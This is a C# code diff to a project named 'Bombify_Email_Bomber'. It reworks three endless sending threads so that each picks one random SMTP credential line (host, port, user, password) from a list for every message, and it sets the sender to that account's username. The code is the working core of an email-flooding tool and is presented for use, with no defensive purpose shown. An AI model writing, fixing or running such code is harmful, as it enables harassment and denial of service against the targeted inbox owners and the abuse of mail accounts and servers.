@@ -97,6 +97,9 @@ namespace Bombify_Email_Bomber
 
             file.Close();
 
+            // Get line count
+            Variables.LineCount = File.ReadLines(Variables.SmtpListPath).Count();
+
             // Display text
             Console.Clear();
             Console.ForegroundColor = ConsoleColor.Yellow;
@@ -147,30 +150,51 @@ namespace Bombify_Email_Bomber
         // Thread 1
         public static void Thread1()
         {
+            // Lines variable
+            int Lines;
+
+            // Infinite loop
             while (true)
             {
+                // Choose what smtp server to use
+                Lines = random.Next(0, Variables.LineCount);
+
                 // Send email
-                SendEmail(SmtpCreds(0), int.Parse(SmtpCreds(1)), SmtpCreds(2), SmtpCreds(3));
+                SendEmail(SmtpCreds(0, Lines), int.Parse(SmtpCreds(1, Lines)), SmtpCreds(2, Lines), SmtpCreds(3, Lines));
             }
         }
 
         // Thread 2
         public static void Thread2()
         {
+            // Lines variable
+            int Lines;
+
+            // Infinite loop
             while (true)
             {
+                // Choose what smtp server to use
+                Lines = random.Next(0, Variables.LineCount);
+
                 // Send email
-                SendEmail(SmtpCreds(0), int.Parse(SmtpCreds(1)), SmtpCreds(2), SmtpCreds(3));
+                SendEmail(SmtpCreds(0, Lines), int.Parse(SmtpCreds(1, Lines)), SmtpCreds(2, Lines), SmtpCreds(3, Lines));
             }
         }
 
         // Thread 3
         public static void Thread3()
         {
-            while(true)
+            // Lines variable
+            int Lines;
+
+            // Infinite loop
+            while (true)
             {
+                // Choose what smtp server to use
+                Lines = random.Next(0, Variables.LineCount);
+
                 // Send email
-                SendEmail(SmtpCreds(0), int.Parse(SmtpCreds(1)), SmtpCreds(2), SmtpCreds(3));
+                SendEmail(SmtpCreds(0, Lines), int.Parse(SmtpCreds(1, Lines)), SmtpCreds(2, Lines), SmtpCreds(3, Lines));
             }
         }
 
@@ -187,7 +211,7 @@ namespace Bombify_Email_Bomber
                 if (Variables.Sender == "None")
                 {
                     // Add default sender
-                    Mail.From = new MailAddress(SmtpCreds(2));
+                    Mail.From = new MailAddress(Username);
                 }
                 else if (Variables.Sender == "rand")
                 {
@@ -258,20 +282,10 @@ namespace Bombify_Email_Bomber
         private static Random random = new Random();
 
         // SmtpCreds method
-        public static string SmtpCreds(int Section)
+        public static string SmtpCreds(int Section, int Line)
         {
-            // Check if OneTime is set to false
-            if (Variables.OneTime == false)
-            {
-                // Get line count
-                Variables.LineCount = File.ReadLines(Variables.SmtpListPath).Count();
-
-                // Set OneTime to true
-                Variables.OneTime = true;
-            }
-
             // return value
-            return Variables.SmtpList[random.Next(0, Variables.LineCount)].Split(':')[Section];
+            return Variables.SmtpList[Line].Split(':')[Section];
         }
 
         // RandomString method
